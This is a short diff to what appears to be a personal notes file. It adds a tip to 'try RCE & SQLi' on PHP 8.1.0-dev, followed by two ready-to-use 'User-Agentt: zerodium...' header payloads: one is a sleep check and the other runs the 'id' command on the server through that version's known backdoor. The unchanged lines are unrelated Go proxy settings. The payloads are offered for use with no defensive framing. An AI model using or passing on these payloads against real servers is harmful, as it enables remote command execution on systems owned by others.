@@ -1,3 +1,10 @@
+If you find PHP 8.1.0-dev then try RCE & SQLi
+User-Agentt: zerodiumsleep(5);
+User-Agentt: zerodiumsystem('id');
+
+
+
+
 go env -w GOPROXY=https://proxy.golang.com.cn,direct
 go env -w GOPROXY=https://goproxy.io,direct
 go env -w GOSUMDB=gosum.io+ce6e7565+AY5qEHUk/qmHc5btzW45JVoENfazw8LielDsaI+lEbq6
